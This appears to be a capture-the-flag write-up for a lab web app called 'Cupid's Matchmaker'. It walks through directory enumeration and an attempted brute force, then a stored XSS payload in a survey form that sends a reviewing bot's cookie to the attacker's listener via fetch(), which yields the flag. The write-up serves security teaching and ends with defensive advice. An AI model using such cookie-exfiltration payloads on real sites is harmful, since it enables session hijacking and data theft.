# Cupid's Matchmaker

## Description

> Tired of soulless algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day!
>
> No algorithms. No AI. Just genuine human connection.

**Target:** `http://10.48.172.199:5000/`

---

## Enumeration

We start by enumerating the web application to identify hidden directories and endpoints.

### Gobuster

```bash
gobuster dir -u http://10.48.172.199:5000 -w /usr/share/wordlists/dirb/common.txt
```

### Results

```text
admin                (Status: 302) [Size: 199] [--> /login]
login                (Status: 200) [Size: 1639]
logout               (Status: 302) [Size: 189] [--> /]
survey               (Status: 200) [Size: 5286]

Progress: 4613 / 4613 (100.00%)
```

The interesting endpoints are:

* `/admin`
* `/login`
* `/logout`
* `/survey`

The `/admin` endpoint redirects to `/login`, indicating that authentication is required to access the admin panel.

---

## Login Page

Navigating to:

```text
http://10.48.172.199:5000/login
```

takes us to the login page.

Since the `/admin` endpoint exists, we assume that an `admin` account may exist.

The next step is therefore to try to discover the password for the `admin` user.

---

## Password Brute Force

We attempted to brute-force the login credentials using tools such as `ffuf`.

However, the brute-force approach did not produce any useful results.

Instead of continuing with password attacks, we move on to investigate the application's functionality.

---

## Survey Page

The `/survey` endpoint provides a form that accepts user input.

Since the challenge description mentions that:

> "Our dedicated matchmaking team reviews every submission"

this suggests that submitted survey responses may be processed by another user or automated bot.

This makes the survey form an interesting attack surface.

Because the form accepts user-controlled input, we test whether the application is vulnerable to **Cross-Site Scripting (XSS)**.

---

## XSS Payload

We use the following payload:

```html
<script>
fetch('http://192.168.139.137:8080/?c=' + btoa(document.cookie));
</script>
```

The payload performs the following actions:

1. Executes JavaScript in the context of the page.
2. Reads the current page's cookies using:

```javascript
document.cookie
```

3. Base64-encodes the cookie using:

```javascript
btoa(document.cookie)
```

4. Sends the encoded cookie to our local HTTP server.

---

## Setting Up the Listener

We start a simple Python HTTP server on our machine:

```bash
python3 -m http.server 8080
```

Our listener is running on:

```text
192.168.139.137:8080
```

We then submit the XSS payload through the survey form.

---

## Capturing the Bot's Cookie

After the survey is processed, our HTTP server receives a request from the target machine.

The request looks like:

```text
10.48.172.199 - - [30/Aug/2026 10:30:39] code 404, message File not found
10.48.172.199 - - [30/Aug/2026 10:30:39] "GET /flag=THM%7BXSS_CuP1d_Str1k3s_Ag41n%7D HTTP/1.1" 404 -
```

The important part is:

```text
/flag=THM%7BXSS_CuP1d_Str1k3s_Ag41n%7D
```

The value is URL-encoded.

Decoding it gives:

```text
flag=THM{XSS_CuP1d_Str1k3s_Ag41n}
```

---

## Flag

```text
THM{XSS_CuP1d_Str1k3s_Ag41n}
```

---

## Attack Chain

The complete attack path was:

```text
Web Enumeration
      |
      v
   /admin
      |
      v
   /login
      |
      v
Brute Force Attempt
      |
      v
   /survey
      |
      v
User-Controlled Input
      |
      v
    XSS
      |
      v
Cookie Exfiltration
      |
      v
Bot Processes Survey
      |
      v
Flag Received
```

---

## Conclusion

The challenge demonstrates how a seemingly harmless user-input form can become an attack vector when input is not properly sanitized.

Although the initial `/admin` endpoint suggested that we might need to obtain administrator credentials through the login page, brute-forcing was unnecessary. The survey functionality provided a more direct attack path.

By injecting JavaScript into the survey and having the privileged bot process the submission, we were able to execute our payload in the bot's context and receive the flag.

### Key Takeaways

* Enumerate web applications before attacking.
* Don't rely solely on brute-force attacks when authentication is present.
* User-controlled input should always be tested for XSS.
* Stored or bot-triggered XSS can be particularly dangerous when executed in a privileged session.
* Cookies and other client-side secrets should be protected using appropriate security controls such as `HttpOnly` and proper input/output sanitization.

**Flag:** `THM{XSS_CuP1d_Str1k3s_Ag41n}`
